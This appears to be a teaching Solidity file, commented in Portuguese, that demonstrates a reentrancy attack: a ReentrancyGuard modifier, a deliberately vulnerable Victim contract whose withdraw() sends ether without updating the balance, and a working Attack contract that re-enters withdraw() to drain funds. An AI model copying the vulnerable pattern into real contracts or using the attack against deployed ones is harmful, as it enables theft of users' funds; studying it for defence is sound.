// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * A reentrada é um método de programação em que uma chamada de função externa faz com que a execução de uma função seja pausada. 
 * As condições na lógica da chamada de função externa permitem que ela se chame repetidamente antes que a execução 
 * original da função seja concluída
 */


/**
 * ReentrancyGuard contrato que utiliza um modificador para evitar ataque de reentrada
*/
abstract contract ReentrancyGuard {
  error NoReentrancy();
  bool locked;

  modifier noReentrancy() {
    if (locked) {
      revert NoReentrancy();
    }
    locked = true;
    _;
    locked = false;
  }
}

/**
 * Victim contrato sem validação para evitar reentrada, que será nosso contrato vítima.
 * Para evitar o ataque herde do contrato ReentrancyGuard o modificador noReentrancy
*/
contract Victim {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    /**
     * Use o modifier noReentrancy, caso contrário a função abaixo pode sofre ataques.
     * ex: function withdraw() external noReentrancy {}
     */
    function withdraw() external  {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "value is less than 0");
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Failed");
    }
}

/**
 * Attack contrato que fará o ataque de reentrada no contrato Victim
*/
contract Attack {
    Victim public victim;

    constructor(Victim _victim) {
        victim = _victim;
    }

    receive() external payable { 
        if(address(victim).balance > 1 ether) {
            victim.withdraw();
        }
    }

    function attack() external  payable {
        require(msg.value >= 1 ether, "minimal value is 1 ether");
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }
}